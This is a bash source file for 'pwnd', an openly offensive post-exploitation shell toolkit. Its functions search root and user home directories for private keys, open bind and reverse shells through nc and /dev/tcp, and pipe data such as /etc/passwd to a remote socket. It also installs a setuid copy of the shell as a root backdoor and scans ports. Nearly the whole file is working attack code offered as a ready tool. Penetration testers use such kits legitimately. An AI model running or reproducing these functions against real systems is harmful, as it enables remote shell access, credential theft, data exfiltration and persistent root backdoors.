#!/usr/bin/env bash

IFS=$' \t\n'


PWND_VERSION="1.0.0"



_pwnd_commands=()



pwnd_register_cmd() {
	_pwnd_commands+=("$1;$2")
}


pwnd_isroot() {
  local retval=0
  if [ $EUID -ne 0 ]; then
    echo "You must be a root user"
    retval=1
  fi
  return $retval
}
 


__hunt_privkeys_usage() {
  cat << "EOF"
usage: __hunt_privkeys [dir ...]
    Find all private keys that are textaully encoded. Each DIR argument will be
    recursively searched. Default directories are: `~root' and `dirname $HOME'
EOF
  return 0
}


hunt_privkeys() {

  local dirs

  if [ $# -eq 0 ]; then
    dirs=(~root "$(dirname $HOME)")
  else
    dirs=("$@")
  fi

  for directory in "${dirs[@]}"; do
    echo "Scanning $directory ..."
    grep -ril "PRIVATE KEY" "$directory" 2> /dev/null
  done

  echo "Done!"

}

pwnd_register_cmd hunt_privkeys "Find all private keys that are textually encoded"
 


__bindshell_usage() {
  cat << "EOF"
usage: bindshell port [arg ...]
    A simple yet "cross platform" implementation of bindshell using nc, mkfifo
    and bash. PORT is a TCP (by default) port number. Each ARG will be passed
    directly to nc
EOF
  return 0
}


bindshell() {
  if [ -z "${1-}" ]; then
  	 __bindshell_usage
     return 0
  fi

  local tempfile=$(mktemp -u)
  local port="$1"
  mkfifo "$tempfile"
  bash -i 2>&1 < "$tempfile" | nc "${@:2}" -l "$port" > "$tempfile"
}

pwnd_register_cmd bindshell "A simple yet \"cross platform\" implementation of bindshell using nc, mkfifo and bash"
 


__reverseshell_usage() {
  cat << "EOF"
usage: reverseshell [-u] host port
    A simple yet "cross platform" implementation of reverseshell using bash
    sockets. HOST can be IPv4 address or hostname. PORT is a TCP (by default)
    port number. The `-u' if specified says use UDP instead of the default option
    of TCP.
EOF
  return 0
}


reverseshell() {
  local host proto port

  if [ "${1-}" == "-u" ]; then
    if [ -z "${3-}" ]; then
  	   __reverseshell_usage
       return 0
    fi
    host="$2"
    proto="udp"
    port="$3"
  else
    if [ -z "${2-}" ]; then
       __reverseshell_usage
       return 0
    fi
    proto="tcp"
    port="$2"
    host="$1"
  fi

  bash -i >& "/dev/$proto/$host/$port" 0>&1
}

pwnd_register_cmd reverseshell "A simple yet \"cross platform\" implementation of reverseshell using bash sockets"
 


__over_socket_usage() {
  cat << "EOF"
usage: over_socket [-u] host port
    A simple yet "cross platform" implementation of generic TCP and UDP socket
    using bash sockets. HOST can be IPv4 address or hostname. PORT is a TCP
    (by default) port number. The `-u' if specified says use UDP instead of
    the default option of TCP.

    Example:

    $ cat /etc/passwd | over_socket localhost 80

      This will open connection to localhost at port 80 TCP and will send over
      the content of `/etc/passwd'
EOF
  return 0
}


over_socket() {
  local host proto port

  if [ "${1-}" == "-u" ]; then
    if [ -z "${3-}" ]; then
  	   __over_socket_usage
       return 0
    fi
    host="$2"
    proto="udp"
    port="$3"
  else
    if [ -z "${2-}" ]; then
       __over_socket_usage
       return 0
    fi
    proto="tcp"
    port="$2"
    host="$1"
  fi

  cat /dev/stdin > "/dev/$proto/$host/$port"
}

pwnd_register_cmd over_socket "A simple yet \"cross platform\" implementation of generic TCP and UDP socket using bash sockets"
 


__install_rootshell_usage() {
  cat << "EOF"
usage: install_rootshell [/path/to/shell] [/path/to/rootshell]
    A simple yet "cross platform" implementation of rootshell using chmod and
    bash. /PATH/TO/SHELL is a path to shell (default: $SHELL). /PATH/TO/ROOTSHELL
    is path to where to install the rootshell (default: mktemp -u)
EOF
  return 0
}


install_rootshell() {
  pwnd_isroot || return 1

  local shellfile=${1-$SHELL}
  local rootshell=${2-$(mktemp -u)}

  cp "$shellfile" "$rootshell"
  chmod u+s "$rootshell"
  ls -la "$rootshell"
}

pwnd_register_cmd install_rootshell "A simple yet \"cross platform\" implementation of rootshell using \`chmod u+s' and bash"
 


__portscanner_usage() {
  cat << "EOF"
usage: portscanner host [port/proto ...], [port-range/proto ...]>
    A simple yet "cross platform" implementation of portscanner using bash
    sockets. HOST can be IPv4 address or hostname. PORT can be any port number.
    PROTO can be `tcp' or `udp'. PORTS is comma-seperated PORTs. PORT-RANGE is
    any range between 1 to 65535 following `/tcp' or `/udp' postfix.

    Examples:

      $ portscanner localhost 80/tcp

        This will check if TCP port 80 is open on localhost.

      $ portscanner localhost 53/tcp,53/udp

        This will check if TCP port 53 and UDP port 53 are opened on localhost.

      $ portscanner localhost 1-1024/tcp,69/udp

        This will check if TCP ports 1 to 1024 are opened and if UDP port 69
        is opened on localhost.
EOF
  return 0
}


__portscanner_timeout() {
  # Based on: http://stackoverflow.com/questions/601543/command-line-command-to-auto-kill-a-command-after-a-certain-amount-of-time
  `perl -e 'alarm shift; open STDERR, "> /dev/null"; exec @ARGV' "$@"`
  # `` works better than $() in Linux when it comes to supressing 'Alarm' message _AND_ still having alarm terminating the process
}


portscanner() {
  if [ -z "${2-}" ]; then
    __portscanner_usage
    return
  fi

  local host="$1"
  local ports=()
  local csv_args=()

  IFS=',' read -ra csv_args <<< "${@:2}"

  for arg in "${csv_args[@]}"; do
    case "$arg" in
      *-*)
        # i.e. 1-1024/tc
        local range_ports=()
        IFS='/' read -ra range_ports <<< "$arg"
        IFS='-' read start end <<< "${range_ports[0]}"
        for ((port=start; port <= end; port++)); do
          ports+=("$port/${range_ports[1]}")
        done
        ;;
      *,*)
        # i.e. '53/tcp, 53/udp'
        IFS=',' read -ra ports <<< "$arg"
        ;;
      *)
        # i.e. '80/tcp'
        ports+=("$arg")
        ;;
    esac
  done

  for port in "${ports[@]}"; do
    local conn_parameter=()
    IFS='/' read -ra conn_parameter <<< "$port"
    __portscanner_timeout 1 "echo >/dev/${conn_parameter[1]}/$host/${conn_parameter[0]}" &&
    echo "port $port is open" ||
    echo "port $port is closed"
  done

}

pwnd_register_cmd portscanner "A simple yet \"cross platform\" implementation of TCP and UDP port scanner using bash sockets"
 


__bash_help_usage() {
  echo "Execute bash builtin help and pass any argument to it"
}


bash_help() {
  local help_topic=""

  if [ ! -z "${1-}" ]; then
    help_topic="$1"
  fi

  bash -c "help $help_topic"
}


__help_usage() {
  cat << "EOF"
usage: pwnd-help <name>
    Display helpful information about pwnd commands. If NAME is specified,
    gives detailed help on command NAME, otherwise a list of the pwnd commands
    is printed.

    To access bash builtin help use: `bash_help'
EOF

  return 0
}


help() {
  if [ ! -z "${1-}" ]; then
    eval "__$1_usage" 2> /dev/null
    if [ $? == 127 ]; then
	    echo "pwnd-help: no help topics match \`$1'. Try \`help' to see all the defined commands"
	    return 127
	  fi
  else
    cat << EOF
pwnd, version ${PWND_VERSION} (${MACHTYPE})
These pwnd commands are defined internally. Type \`help' to see this list.
Type \`help name' to find out more about the pwnd command \`name'.

EOF
    for pwnd_command in "${_pwnd_commands[@]-}"; do
      IFS=';' read -ra pwnd_cmd_parameters <<< "$pwnd_command"
      # IFS=';' pwnd_cmd_parameters=($pwnd_command)
      printf "%-19s -- %s\n" "${pwnd_cmd_parameters[0]}" "${pwnd_cmd_parameters[1]}"
    done
  fi
}



cat << EOF
[Pwnd v${PWND_VERSION}, Itzik Kotler (@itzikkotler)]"
Type \`help' to display all the pwnd commands.
Type \`help name' to find out more about the pwnd command \`name'.

EOF

PS1="(\[\033[92m\]\[\033[1m\]pwnd\[\033[0m\]\[\033[39m\])${PS1-}"
 
